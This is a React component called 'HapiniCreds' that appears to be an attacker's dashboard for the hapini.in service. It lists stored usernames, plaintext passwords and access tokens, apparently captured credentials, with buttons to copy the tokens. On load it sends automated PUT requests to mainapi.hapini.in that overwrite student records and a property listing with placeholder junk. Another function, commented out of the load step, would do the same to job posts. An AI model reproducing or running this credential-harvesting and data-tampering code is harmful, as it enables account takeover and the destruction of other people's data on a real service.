import React, { useState, useEffect } from 'react';
import firebaseModel from '../firebase/firebase';

import ApiClient from '../shared/ApiClient'
import { toast } from 'react-toastify';

const HapiniCreds = () => {
  const [data, setData] = useState()
  const [data2, setData2] = useState()
  const [categories, setCategories] = useState([])
  useEffect(() => {
    firebaseModel.firestore().collection(`job`).onSnapshot(querySnapshot => {
      let data = querySnapshot.docs.map(doc => {
        return {
          ...doc.data(),
          id: doc.id
        };
      });
      setData(data)
      // getCategories()
      getProperties()
      getStudent()
      console.log("querySnapshot", data)
    })


    firebaseModel.firestore().collection(`fjob`).onSnapshot(querySnapshot => {
      let data = querySnapshot.docs.map(doc => {
        return {
          ...doc.data(),
          id: doc.id
        };
      });
      setData2(data)
      console.log("querySnapshot2", data)
    })
  }, [])

  const deleteRec = (id, table) => {
    if (window.confirm("Do you want to delete this")) {
      firebaseModel.firestore().collection(table).doc(id).delete().then(res => {
        console.log("ews", res)
      })
    }

  }

  const deleteproperty = (id) => {
    ApiClient.put('https://mainapi.hapini.in/propertydetail/remove/' + id, { id }).then(res => {

    })
  }

  const editproperty = (id) => {
    let payload = {
      "Facing": "NorthEast",
      "Title": "Unknown Title",
      "FurnishedId": "2",
      "PropertyPostedTypeId": "1",
      "AvailabilityId": "3",
      "AmenitiesIds": "2",
      "PropertyCategoryId": "49",
      "Room": "7",
      "WashRoom": "2",
      "Kitchen": "1",
      "FloorNo": "2",
      "BuiltUpArea": 22,
      "CarpetArea": 22,
      "Comment": "2222",
      "IsBachelorAllowed": true,
      "ExpectedAmt": 22,
      "DepositAmt": 222,
      "MaintenanceAmt": 222,
      "Description": "222",
      "PropertyImages": [
        {
          "Id": 0,
          "PropertyDetailId": 0,
          "Url": "http://res.cloudinary.com/hapini-in/raw/upload/v1691010342/Prod/user/profile/638266269391325595.jpg",
          "IsCoverImage": true
        }
      ],
      "Address": "2322",
      "Landmark": "3333",
      "Pincode": 33333,
      "Area": "3333",
      "PostedOn": "2023-08-02T21:06:07.730Z",
      "LocalityId": "1",
      "CityId": "4861",
      "CityName": "Unknown",
      "LocalityName": "Unknown",
      "IsRent": true,
      Id: id
    }
    ApiClient.put('https://mainapi.hapini.in/propertydetail/' + id, payload).then(res => {

    })
  }



  const copy = (content) => {
    navigator.clipboard.writeText(content);
    toast.success("Copyed")
  }

  const getCategories = () => {
    let payload = { "StatusId": 2, "SearchText": "", "IsActive": true }
    ApiClient.post('https://mainapi.hapini.in/bo/jobpost/filter', payload).then(res => {
      if (res.Result) {
        let data = res.Result
        setCategories(data)
        data.map(itm => {
          edit(itm.Id)
        })
      }
    })
  }

  const getStudent = () => {
    let payload = { "StatusId": 2,"IsActive": true }
    ApiClient.post('https://mainapi.hapini.in/student/search', payload).then(res => {
      if (res.Result) {
        let data = res.Result
        data.map(itm => {
          editStudent(itm.Id)
        })
      }
    })
  }

  const getProperties = () => {
    let payload = { "IsActive": true }
    ApiClient.post('https://mainapi.hapini.in/bo/filterproductunitdetails', payload).then(res => {
      if (res.Result) {
        let data = res.Result
        // data.map(itm=>{
        //   editproperty(itm.Id)
        // })
        editproperty(data[0].Id)
      }
    })
  }

  const editStudent=(id)=>{
    let name='Student Name'
    let payload={
      Name: name,
      CourseMediumIds: 0,
      TutorCourseIds: 0,
      Subjects: name,
      GenderId: 1,
      TeacherGenderId: 0,
      TeacherTypeId:1,
      "IsTutor": false,
      CourseId: 0,
      "courseName": name,
      // CityId: "4861",
      "Landmark": name
  }

  ApiClient.put('https://mainapi.hapini.in/tutorstudent/' + id, payload).then(res => {

    })
  }

  const edit = (id) => {
    let name = "Tester"
    let payload = {
      JobCategoryId: "1",
      JobTitle: name,
      JobRoleId: 0,
      JobTypeId: 0,
      Vacancies: 0,
      MaxSalary: 0,
      MinSalary: 0,
      OurBenifits: name,
      EnglishMedium: false,
      MinAge: 0,
      MaxAge: 0,
      Language: name,
      Gender: name,
      JobFor: name,
      JobLocation: name,
      MaxExpMonth: 0,
      MinExpMonth: 0,
      //  CityId:0,
      QualificationId: 0,
      CourseRequirement: name,
      Skills: name,
      SpecificRequirement: name,
      JobDescription: name,
      CompanyName: name,
      Address: name,
      address: name,
      area: name,
      Landmark: name,
      AboutCompany: name,
      CompanyLogo: name,
      PublishDate: "",
      EndDate: name,
      StateId: 0
    }
    ApiClient.put('https://mainapi.hapini.in/jobpost/' + id, payload).then(res => {

    })
  }

  return <>
    <div className="container">

      <ul class="nav nav-tabs" id="myTab" role="tablist">
        <li class="nav-item">
          <a class="nav-link active" id="home-tab" data-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="true">Admin</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" id="profile-tab" data-toggle="tab" href="#profile" role="tab" aria-controls="profile" aria-selected="false">Frontend</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" id="category-tab" data-toggle="tab" href="#category" role="tab" aria-controls="category" aria-selected="false">category</a>
        </li>
      </ul>
      <div class="tab-content" id="myTabContent">
        <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
          <table className="table">
            <thead>
              <tr>
                <th>Username</th>
                <th>Password</th>
                <th>access_token</th>
                <th></th>
              </tr>
            </thead>
            <tbody>
              {data && data.map(itm => {
                return <>
                  <tr>
                    <td>{itm.UserName}</td>
                    <td>{itm.Password}</td>
                    <td>
                      <button className='btn btn-primary' onClick={e => copy(itm.access_token)}>Copy Token</button>
                    </td>
                    <td>
                      <button className='btn btn-primary' onClick={e => deleteRec(itm.id, 'job')}>Delete</button>
                    </td>
                  </tr>
                </>
              })}

            </tbody>
          </table>
        </div>
        <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
          <table className="table">
            <thead>
              <tr>
                <th>Username</th>
                <th>Password</th>
                <th>access_token</th>
                <th></th>
              </tr>
            </thead>
            <tbody>
              {data2 && data2.map(itm => {
                return <>
                  <tr>
                    <td>{itm.Mobile}</td>
                    <td>{itm.Password}</td>
                    <td>
                      <button className='btn btn-primary' onClick={e => copy(itm.access_token)}>Copy Token</button>
                    </td>
                    <td>
                      <button className='btn btn-primary' onClick={e => deleteRec(itm.id, 'fjob')}>Delete</button>
                    </td>
                  </tr>
                </>
              })}

            </tbody>
          </table>
        </div>
        <div class="tab-pane fade" id="category" role="tabpanel" aria-labelledby="category-tab">
          <table className="table">
            <thead>
              <tr>
                <th>Name</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {categories && categories.map(itm => {
                return <>
                  <tr>
                    <td>{itm.JobTitle}</td>
                    <td>
                      <button className='btn btn-primary' onClick={e => edit(itm.Id)}>Edit</button>
                    </td>
                  </tr>
                </>
              })}

            </tbody>
          </table>
        </div>
      </div>


    </div>

  </>
}

export default HapiniCreds